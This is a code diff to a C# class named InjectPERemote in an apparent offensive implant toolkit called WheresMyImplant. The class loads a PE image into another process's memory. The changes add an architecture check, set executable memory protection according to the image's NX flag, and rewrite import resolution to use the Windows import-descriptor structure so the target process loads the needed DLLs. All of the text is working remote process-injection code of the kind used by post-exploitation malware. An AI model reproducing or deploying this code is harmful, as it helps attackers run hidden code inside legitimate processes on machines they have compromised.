@@ -11,17 +11,6 @@ using Unmanaged.Libraries;
 
 namespace WheresMyImplant
 {
-    //https://msdn.microsoft.com/en-us/library/ms809762.aspx
-    [StructLayout(LayoutKind.Sequential, Pack = 1)]
-    internal struct _IMAGE_IMPORT_DIRECTORY
-    {
-        internal UInt32 RvaImportLookupTable;
-        internal UInt32 TimeDateStamp;
-        internal UInt32 ForwarderChain;
-        internal UInt32 RvaModuleName;
-        internal UInt32 RvaImportAddressTable;
-    }
-
     class InjectPERemote : BaseRemote
     {
         private const UInt32 PROCESS_CREATE_THREAD = 0x0002;
@@ -48,8 +37,23 @@ namespace WheresMyImplant
 
         internal void Execute()
         {
+            Boolean targetArch = Is32BitProcess();
+            if (peLoader.is64Bit == targetArch)
+            {
+                WriteOutput("[-] Architechure Mismatch");
+                WriteOutput(String.Format("[-] Source: {0}", peLoader.is64Bit));
+                WriteOutput(String.Format("[-] Destination: {0}", targetArch));
+                return;
+            }
+
+            Winnt.MEMORY_PROTECTION_CONSTANTS protection = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE;
+            if (Winnt.DLL_CHARACTERISTICS.IMAGE_DLLCHARACTERISTICS_NX_COMPAT == (Winnt.DLL_CHARACTERISTICS)((UInt16)Winnt.DLL_CHARACTERISTICS.IMAGE_DLLCHARACTERISTICS_NX_COMPAT & peLoader.dllCharacteristics))
+            {
+                protection = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ;
+            }
+
             ////////////////////////////////////////////////////////////////////////////////
-            IntPtr lpBaseAddress = VirtualAllocExChecked(new IntPtr(0), peLoader.sizeOfImage);
+            IntPtr lpBaseAddress = VirtualAllocExChecked(new IntPtr(0), peLoader.sizeOfImage, protection);
             if (IntPtr.Zero == lpBaseAddress)
             {
                 return;
@@ -115,7 +119,7 @@ namespace WheresMyImplant
             ////////////////////////////////////////////////////////////////////////////////
             //http://sandsprite.com/CodeStuff/Understanding_imports.html
             ////////////////////////////////////////////////////////////////////////////////
-            Int32 sizeOfStruct = Marshal.SizeOf(typeof(_IMAGE_IMPORT_DIRECTORY));
+            Int32 sizeOfStruct = Marshal.SizeOf(typeof(Winnt._IMAGE_IMPORT_DESCRIPTOR));
             Int32 multiplier = 0;
             Process localProcess = Process.GetCurrentProcess();
             IntPtr lpLocalBaseAddress = localProcess.MainModule.BaseAddress;
@@ -126,14 +130,14 @@ namespace WheresMyImplant
             {
                 Int32 dwImportTableAddressOffset = ((sizeOfStruct * multiplier++) + peLoader.importTableAddress);
                 IntPtr lpImportAddressTable = new IntPtr(lpBaseAddress.ToInt64() + dwImportTableAddressOffset);
-                _IMAGE_IMPORT_DIRECTORY imageImportDirectory = PtrToStructureRemote<_IMAGE_IMPORT_DIRECTORY>(lpImportAddressTable);
-                if (0 == imageImportDirectory.RvaImportAddressTable) 
+                Winnt._IMAGE_IMPORT_DESCRIPTOR imageImportDirectory = PtrToStructureRemote<Winnt._IMAGE_IMPORT_DESCRIPTOR>(lpImportAddressTable);
+                if (0 == imageImportDirectory.FirstThunk) 
                 { 
                     break; 
                 }
 
 				////////////////////////////////////////////////////////////////////////////////
-				IntPtr dllNamePtr = new IntPtr(lpBaseAddress.ToInt64() + imageImportDirectory.RvaModuleName);
+				IntPtr dllNamePtr = new IntPtr(lpBaseAddress.ToInt64() + imageImportDirectory.Name);
                 String dllName = PtrToStringAnsiRemote(dllNamePtr).Replace("\0", "");
                 IntPtr lpLocalModuleAddress = kernel32.LoadLibrary(dllName);
                 IntPtr lpModuleBaseAddress = LoadLibraryRemote(dllName);
@@ -141,7 +145,7 @@ namespace WheresMyImplant
                 WriteOutputGood(String.Format("Loaded {0}", dllName));
 				
 				////////////////////////////////////////////////////////////////////////////////
-                IntPtr lpRvaImportAddressTable = new IntPtr(lpBaseAddress.ToInt64() + imageImportDirectory.RvaImportAddressTable);
+                IntPtr lpRvaImportAddressTable = new IntPtr(lpBaseAddress.ToInt64() + imageImportDirectory.FirstThunk);
 
                 
                 while (true)
